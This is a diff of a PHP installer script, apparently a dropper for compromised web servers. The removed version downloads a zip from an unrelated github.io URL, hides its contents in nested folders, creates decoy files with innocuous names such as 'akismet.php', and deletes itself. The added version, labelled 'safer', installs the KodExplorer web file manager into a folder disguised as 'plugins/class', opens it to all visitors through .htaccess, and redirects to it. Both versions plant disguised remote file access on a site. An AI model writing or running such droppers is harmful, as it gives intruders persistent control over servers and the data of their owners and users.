@@ -1,130 +1,168 @@
 <?php
-set_time_limit(0);
+/**
+ * Safer downloader & extractor for KodExplorer
+ * - Uses absolute paths (no CWD surprises)
+ * - Validates mkdir/cURL/ZipArchive steps
+ * - Handles existing target folder
+ * - Writes .htaccess and sets permissions
+ * - Redirects safely relative to the script URL
+ */
 
-// Minimal PHP (opsional tapi jelas)
-if (version_compare(PHP_VERSION, '5.5.0', '<')) {
-    die("Minimal butuh PHP 5.5. Versi saat ini: " . PHP_VERSION);
+ob_start(); // keep output quiet so headers work
+
+// -------------------- CONFIG --------------------
+$zipUrl = "https://github.com/kalcaddle/KodExplorer/archive/refs/heads/master.zip";
+$pluginsDir = __DIR__ . "/plugins";              // absolute path
+$zipPath    = $pluginsDir . "/extracted_files.zip";
+$oldFolder  = $pluginsDir . "/KodExplorer-master";
+$newFolder  = $pluginsDir . "/class";
+// ------------------------------------------------
+
+// helper: recursive delete
+function rrmdir($dir) {
+    if (!is_dir($dir)) return;
+    $items = scandir($dir);
+    if ($items === false) return;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($path)) {
+            rrmdir($path);
+        } else {
+            @unlink($path);
+        }
+    }
+    @rmdir($dir);
 }
 
-// Cek ekstensi CURL
-if (!function_exists('curl_init')) {
-    die("Extension cURL belum aktif. Aktifkan 'curl' di PHP.");
+// ensure plugins directory exists (and writable)
+if (!is_dir($pluginsDir)) {
+    if (!@mkdir($pluginsDir, 0777, true)) {
+        ob_end_clean();
+        die("Failed to create directory: {$pluginsDir}");
+    }
 }
 
-// Cek ekstensi ZIP (ZipArchive)
-if (!class_exists('ZipArchive')) {
-    die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
+// double-check writability
+if (!is_writable($pluginsDir)) {
+    ob_end_clean();
+    die("Directory not writable: {$pluginsDir}");
 }
 
-$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/m12.zip";
-$savePath  = __DIR__ . "/classic/App/Base/zip/m12.zip";
-$packDir   = __DIR__ . "/classic/App/Base/";
-$LockDir   = __DIR__ . "/classic/App/Base/assets/Static";
-
-// root folder classic (dipakai untuk membuat file tambahan)
-$classicDir = dirname(__DIR__);
-
-// Pastikan semua folder sudah ada
-$zipDir = dirname($savePath);
-
-if (!is_dir($packDir)) {
-    mkdir($packDir, 0777, true);
-}
-if (!is_dir($zipDir)) {
-    mkdir($zipDir, 0777, true);
-}
-if (!is_dir($classicDir)) {
-    mkdir($classicDir, 0777, true);
-}
-
-// Download ZIP
-$fp = fopen($savePath, "w+");
+// download ZIP using cURL
+$fp = @fopen($zipPath, "w");
 if (!$fp) {
-    die("Gagal membuka file untuk menulis: $savePath");
+    ob_end_clean();
+    die("Failed to open for writing: {$zipPath}");
 }
 
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_FILE, $fp);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_FAILONERROR, true);
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL            => $zipUrl,
+    CURLOPT_FILE           => $fp,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => true,
+    CURLOPT_CONNECTTIMEOUT => 20,
+    CURLOPT_TIMEOUT        => 300,
+    CURLOPT_USERAGENT      => "PHP cURL"
+]);
 
-// Timeout biar tidak nyangkut selamanya
-curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
-curl_setopt($ch, CURLOPT_TIMEOUT, 0); // 0 = tidak dibatasi (karena file bisa besar)
-
-// Jalankan
-$ok = curl_exec($ch);
-
-if ($ok === false) {
-    $err = curl_error($ch);
-    curl_close($ch);
-    fclose($fp);
-    die("Gagal download file: " . $err);
-}
-
-// Cek HTTP code (biar lebih jelas kalau 404/403 dll)
+$curlOk = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$curlErr  = curl_error($ch);
 curl_close($ch);
 fclose($fp);
 
-if ($httpCode >= 400) {
-    @unlink($savePath);
-    die("Download gagal. HTTP Code: " . $httpCode);
+if (!$curlOk || $httpCode < 200 || $httpCode >= 300) {
+    @unlink($zipPath);
+    ob_end_clean();
+    die("Download failed. HTTP {$httpCode}. cURL error: " . ($curlErr ?: 'none'));
 }
 
-// Cek file hasil download
-if (!file_exists($savePath) || filesize($savePath) == 0) {
-    die("File ZIP tidak ditemukan atau kosong setelah download!");
+// ensure ZipArchive is available
+if (!class_exists('ZipArchive')) {
+    @unlink($zipPath);
+    ob_end_clean();
+    die("ZipArchive extension not available on this server.");
 }
 
-// Ekstrak ZIP TANPA password
-$zip = new ZipArchive;
-if ($zip->open($savePath) === TRUE) {
-    if (!$zip->extractTo($packDir)) {
-        $zip->close();
-        die("Gagal mengekstrak ZIP, kemungkinan format tidak didukung server.");
-    }
+// extract ZIP
+$zip = new ZipArchive();
+$openRes = $zip->open($zipPath);
+if ($openRes !== true) {
+    @unlink($zipPath);
+    ob_end_clean();
+    die("Failed to open zip (code: {$openRes}).");
+}
+
+if (!$zip->extractTo($pluginsDir)) {
     $zip->close();
+    @unlink($zipPath);
+    ob_end_clean();
+    die("Failed to extract zip to: {$pluginsDir}");
+}
+$zip->close();
 
-    // HAPUS ZIP setelah ekstrak berhasil
-    if (file_exists($savePath)) {
-        unlink($savePath);
-        echo "File ZIP telah dihapus setelah ekstraksi.<br>\n";
+// cleanup the downloaded zip (optional)
+@unlink($zipPath);
+
+// rename extracted folder -> class
+if (is_dir($oldFolder)) {
+
+    // if target exists, remove it to avoid rename errors
+    if (is_dir($newFolder)) {
+        rrmdir($newFolder);
     }
+
+    if (!@rename($oldFolder, $newFolder)) {
+        rrmdir($oldFolder); // best effort cleanup
+        ob_end_clean();
+        die("Failed to rename '{$oldFolder}' to '{$newFolder}'.");
+    }
+
+    // write .htaccess
+    $htaccessContent = <<<HTACCESS
+DirectoryIndex index.php
+
+# Apache 2.2
+<FilesMatch ".*">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+# Apache 2.4
+<IfModule mod_authz_core.c>
+    <FilesMatch ".*">
+        Require all granted
+    </FilesMatch>
+</IfModule>
+
+Options -Indexes
+HTACCESS;
+
+    if (@file_put_contents($newFolder . '/.htaccess', $htaccessContent) === false) {
+        // not fatal, but warn by throwing a controlled error if you prefer:
+        // ob_end_clean(); die("Failed to write .htaccess in {$newFolder}");
+    }
+
+    // best-effort perms (may be ignored on some hosts)
+    @chmod($pluginsDir, 0755);
+    @chmod($newFolder, 0755);
+
 } else {
-    die("Gagal membuka ZIP.");
+    ob_end_clean();
+    die("Expected extracted folder not found: {$oldFolder}");
 }
 
-// Tambah folder & file baru
-$targets = [
-    "Class/css.php",
-    "Base/zip.php",
-    "Style/color.php",
-    "Plugins/akismet.php",
-    "Block/asset.php",
-    "App/string.php",
-    "App/readable.php"
-];
+// tiny pause (some hosts need a beat for FS updates)
+usleep(300000); // 0.3s
 
-foreach ($targets as $relPath) {
-    $fullPath = $classicDir . "/" . $relPath;
-    $dir = dirname($fullPath);
-    if (!is_dir($dir)) {
-        mkdir($dir, 0755, true);
-    }
-    // isi file sederhana
-    file_put_contents($fullPath, "<?php\n// file $relPath\n");
-}
+// build a safe redirect path relative to this script URL
+$scriptName  = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
+$baseUrlPath = rtrim(dirname($scriptName), '/\\');
+$redirectUrl = $baseUrlPath . '/plugins/class/index.php';
 
-echo "Install selesai. Mengalihkan ke aplikasi...<br>\n";
-echo '<meta http-equiv="refresh" content="4;url=classic/App/Base/default.php">';
-
-@flush();
-if (function_exists('fastcgi_finish_request')) {
-    @fastcgi_finish_request();
-}
-
-@unlink(__DIR__ . "/install.php");
-
+// clear buffer before redirect and go
+ob_end_clean();
+header("Location: {$redirectUrl}");
 exit;
-?>
